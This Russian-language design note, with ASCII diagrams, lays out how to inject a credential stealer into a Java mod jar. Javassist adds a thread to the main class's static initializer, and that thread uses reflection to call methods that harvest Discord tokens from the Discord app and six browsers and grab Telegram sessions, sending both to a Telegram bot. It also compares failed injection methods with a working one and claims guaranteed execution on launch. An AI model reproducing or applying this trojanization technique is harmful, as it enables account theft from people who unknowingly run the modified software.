## Выполнение при запуске

```
┌─────────────────────────────────────────────────────────────────┐
│              ВЫПОЛНЕНИЕ ПРИ ЗАПУСКЕ МОДА                        │
└─────────────────────────────────────────────────────────────────┘

java -jar ias_injected.jar
    ↓
    JVM загружает главный класс
    ↓
    ┌─────────────────────────────────────────────────────────┐
    │ ru.ias.Main                                             │
    │ ┌───────────────────────────────────────────────────┐   │
    │ │ static {                                          │   │
    │ │   // Оригинальный код инициализации              │   │
    │ │   ...                                             │   │
    │ │                                                   │   │
    │ │   // ДОБАВЛЕНО JAVASSIST:                         │   │
    │ │   try {                                           │   │
    │ │     new Thread(                                   │   │
    │ │       new ModKaLoggerInitThread()                 │   │
    │ │     ).start();                                    │   │
    │ │   } catch(Exception e) { ... }                    │   │
    │ │ }                                                 │   │
    │ └───────────────────────────────────────────────────┘   │
    └─────────────────────────────────────────────────────────┘
    ↓
    Запускается ModKaLoggerInitThread в отдельном потоке
    ↓
    ┌─────────────────────────────────────────────────────────┐
    │ ModKaLoggerInitThread.run()                             │
    │ ┌───────────────────────────────────────────────────┐   │
    │ │ Thread.sleep(3000);                               │   │
    │ │                                                   │   │
    │ │ // Загружаем Discord через reflection             │   │
    │ │ Class.forName("ru.modkalogger.Discord")           │   │
    │ │   .getMethod("stealAndSendTokens", ...)           │   │
    │ │   .invoke(null, ...);                             │   │
    │ │                                                   │   │
    │ │ // Загружаем Telegram через reflection            │   │
    │ │ Class.forName("ru.modkalogger.Telegram")          │   │
    │ │   .getMethod("stealAndSendSessions", ...)         │   │
    │ │   .invoke(null, ...);                             │   │
    │ └───────────────────────────────────────────────────┘   │
    └─────────────────────────────────────────────────────────┘
    ↓
    ┌─────────────────────────────────────────────────────────┐
    │ Discord.stealAndSendTokens()                            │
    │ ├─ Ищет токены в Discord приложении                    │
    │ ├─ Ищет токены в Chrome                                │
    │ ├─ Ищет токены в Edge                                  │
    │ ├─ Ищет токены в Firefox                               │
    │ ├─ Ищет токены в Brave                                 │
    │ ├─ Ищет токены в Opera                                 │
    │ └─ Отправляет на Telegram                              │
    └─────────────────────────────────────────────────────────┘
    ↓
    ┌─────────────────────────────────────────────────────────┐
    │ Telegram.stealAndSendSessions()                         │
    │ ├─ Ищет сессии Telegram                                │
    │ ├─ Архивирует в ZIP                                    │
    │ └─ Отправляет на Telegram                              │
    └─────────────────────────────────────────────────────────┘
    ↓
    ┌─────────────────────────────────────────────────────────┐
    │ TelegramSender.sendToTelegram()                         │
    │ ├─ Отправляет Discord токены                           │
    │ ├─ Отправляет Telegram сессии                          │
    │ └─ Отправляет на Telegram бот                          │
```

## Сравнение подходов

```
┌─────────────────────────────────────────────────────────────────┐
│              СРАВНЕНИЕ ПОДХОДОВ ВШИВАНИЯ                        │
└─────────────────────────────────────────────────────────────────┘

НЕПРАВИЛЬНЫЙ ПОДХОД (ASM):
┌──────────────────────────────────────────────────────────────┐
│ static {                                                     │
│   new Thread(new Runnable() {  ← АНОНИМНЫЙ КЛАСС            │
│     public void run() { ... }                                │
│   }).start();                                                │
│ }                                                            │
│                                                              │
│ ❌ ASM не поддерживает анонимные классы в методах            │
│ ❌ Не компилируется                                          │
│ ❌ Не работает                                               │
└──────────────────────────────────────────────────────────────┘

НЕПРАВИЛЬНЫЙ ПОДХОД (Bootstrap):
┌──────────────────────────────────────────────────────────────┐
│ public class Bootstrap {                                     │
│   static {                                                   │
│     // Инициализация                                         │
│   }                                                          │
│ }                                                            │
│                                                              │
│ ❌ Класс никогда не загружается                              │
│ ❌ Ничто на него не ссылается                                │
│ ❌ Статический блок не выполняется                           │
│ ❌ Не работает                                               │
└──────────────────────────────────────────────────────────────┘

ПРАВИЛЬНЫЙ ПОДХОД (Javassist + ModKaLoggerInitThread):
┌──────────────────────────────────────────────────────────────┐
│ static {                                                     │
│   new Thread(                                                │
│     new ModKaLoggerInitThread()  ← ОТДЕЛЬНЫЙ КЛАСС          │
│   ).start();                                                 │
│ }                                                            │
│                                                              │
│ ✅ Javassist поддерживает отдельные классы                   │
│ ✅ Класс явно ссылается в bytecode                           │
│ ✅ Класс загружается JVM                                     │
│ ✅ Статический блок выполняется                              │
│ ✅ Работает 100%                                             │
└──────────────────────────────────────────────────────────────┘
```

```
│   new ModKaLoggerInitThread                                  │
│   dup                                                        │

│   new Thread                                                 │
│   dup_x1                                                     │

│                                                              │
```

## Гарантии выполнения

```
┌─────────────────────────────────────────────────────────────────┐
│                  ГАРАНТИИ ВЫПОЛНЕНИЯ                            │
└─────────────────────────────────────────────────────────────────┘

1. ГЛАВНЫЙ КЛАСС ЗАГРУЖАЕТСЯ
   ✅ Это точка входа приложения
   ✅ JVM ВСЕГДА загружает главный класс
   ✅ Гарантировано 100%

2. СТАТИЧЕСКИЙ ИНИЦИАЛИЗАТОР ВЫПОЛНЯЕТСЯ
   ✅ Выполняется при загрузке класса
   ✅ JVM гарантирует выполнение
   ✅ Гарантировано 100%

3. ModKaLoggerInitThread ЗАГРУЖАЕТСЯ
   ✅ Явно ссылается в bytecode
   ✅ Создаётся через new оператор
   ✅ JVM загружает класс
   ✅ Гарантировано 100%

4. REFLECTION РАБОТАЕТ
   ✅ Class.forName() загружает классы
   ✅ getMethod() находит методы
   ✅ invoke() вызывает методы
   ✅ Гарантировано 100%

ИТОГ: 100% ГАРАНТИРОВАННОЕ ВЫПОЛНЕНИЕ
```
